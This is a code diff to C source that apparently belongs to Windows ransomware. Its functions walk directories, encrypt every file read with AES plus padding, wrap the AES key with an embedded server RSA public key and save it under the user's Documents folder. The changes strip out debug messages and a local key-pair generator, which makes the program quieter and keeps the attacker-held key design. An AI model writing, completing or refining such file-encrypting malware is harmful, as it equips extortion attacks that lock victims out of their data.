@@ -452,6 +452,7 @@ BOOL ReadFromFile(PBYTE* pData, WCHAR* pfilePath, SIZE_T* szData) {
 
 	*pData = buffer;
 	*szData = numberOfBytesToRead;
+
 	bSuccess = TRUE;
 	buffer = NULL; 
 
@@ -533,7 +534,6 @@ BOOL WriteToFile(PBYTE buffer, WCHAR* pfilePath, SIZE_T numberOfBytesToWrite) {
 
 	if (numberOfBytesToWrite < 1024) {
 		if (!SetEndOfFile(hFile)) {
-			printf("[!] Cannot truncate file %d\n", GetLastError());
 			goto _EndFunction;
 		}
 	}
@@ -594,7 +594,6 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 	WCHAR searchPattren[MAX_PATH * sizeof(WCHAR)];
 	WIN32_FIND_DATA fileData;
 	DWORD dwError = NULL;
-	LARGE_INTEGER szFile = { 0 };
 
 	StringCchCopy(searchPattren, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
 	StringCchCat(searchPattren, MAX_PATH * sizeof(WCHAR), L"\\*");
@@ -645,8 +644,6 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 			}
 		}
 		else {
-			szFile.LowPart = fileData.nFileSizeLow;
-			szFile.HighPart = fileData.nFileSizeHigh;
 
 			if (!ReadFromFile(&pData, filePath, &szData)) {
 				continue;
@@ -671,7 +668,7 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 					else break;
 				}
 
-				if(count >= szData && szData % 16 != 0){
+				if(count >= szData && szData % 16 != 0 ){
 					if (!AddPadding(plaintext, &szplaintext)) {
 						if (pData) LocalFree(pData);
 						if (encryptedData) LocalFree(encryptedData);
@@ -740,7 +737,6 @@ BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {
 
 
 	if (!pCryptAcquireContext(hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-		printf("Error %u acquiring cryptographic context\n", GetLastError());
 		return FALSE;
 	}
 
@@ -756,38 +752,11 @@ BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {
 
 
 	if (!pCryptImportKey(*hCryptProv, serverPublicKey, sizeof(serverPublicKey), 0, CRYPT_EXPORTABLE, hKey)) {
-		printf("error %d", GetLastError());
 		return FALSE;
 	}
 
 	return TRUE;
 }
-
-BOOL GenerateKeyPairs(HCRYPTPROV* phCryptProv, HCRYPTKEY* phKey) {
-
-	HCRYPTPROV hCryptProv;
-	HCRYPTKEY hKey;
-
-
-
-		if (!CryptAcquireContextW(&hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-			printf("Error %u acquiring cryptographic context\n", GetLastError());
-			return FALSE;
-		}
-
-		if (!CryptGenKey(hCryptProv, AT_KEYEXCHANGE, RSA1024BIT_KEY | CRYPT_EXPORTABLE, &hKey)) {
-			printf("Error %u generating RSA key pair\n", GetLastError());
-			CryptReleaseContext(hCryptProv, 0);
-			return FALSE;
-		}
-
-		printf("\nRSA key pair generated successfully!\n");
-
-		*phCryptProv = hCryptProv;
-		*phKey = hKey;
-
-		return TRUE;
-	}
 
 BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,PBYTE* cipher) {
 	
@@ -802,13 +771,11 @@ BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,PBYTE* cipher) {
 	);
 
 	if (!pCryptEncrypt(hKey, NULL, TRUE, 0, NULL, &cipherTextLen, 0)) {
-		printf("Error determining buffer size: %d\n", GetLastError());
 		return FALSE;
 	}
 
 	pbBlob = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cipherTextLen);
 	if (!pbBlob) {
-		printf("Memory allocation failed\n");
 		return FALSE;
 	}
 
@@ -816,7 +783,6 @@ BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,PBYTE* cipher) {
 	dataLen = (DWORD)*keySize;
 
 	if (!pCryptEncrypt(hKey, NULL, TRUE, 0, pbBlob, &dataLen, cipherTextLen)) {
-		printf("Encryption error: %d\n", GetLastError());
 		HeapFree(GetProcessHeap(), 0, pbBlob);
 		return FALSE;
 	}
@@ -841,7 +807,6 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 	WCHAR AESkeyPath[MAX_PATH] = { 0 };
 
 	if (keyPath == NULL) {
-		printf("Invalid keyPath parameter\n");
 		return FALSE;
 	}
 
@@ -856,23 +821,19 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 	lstrcpy(AESkeyPath, keyPath);
 
 	if (FAILED(StringCchCat(AESkeyPath, MAX_PATH, L"\\Documents\\AES_key"))) {
-		printf("Path concatenation failed for AES key\n");
 		return FALSE;
 	}
 
 
 	if (!ImportPubkey(&hProv,&serverHandlePKey)) {
-		printf("Failed to import server public key\n");
 		goto _EndFucntion;
 	}
 
 	if (!EncryptAESKey(serverHandlePKey, (PBYTE)keyValue, &szEncAESKey, &encAESKey)) {
-		printf("Failed to encrypt AES key\n");
 		goto _EndFucntion;
 	}
 
 	if (!WriteToFile(encAESKey, AESkeyPath, szEncAESKey)) {
-		printf("Failed to write AES key to file\n");
 		goto _EndFucntion;
 	}
 
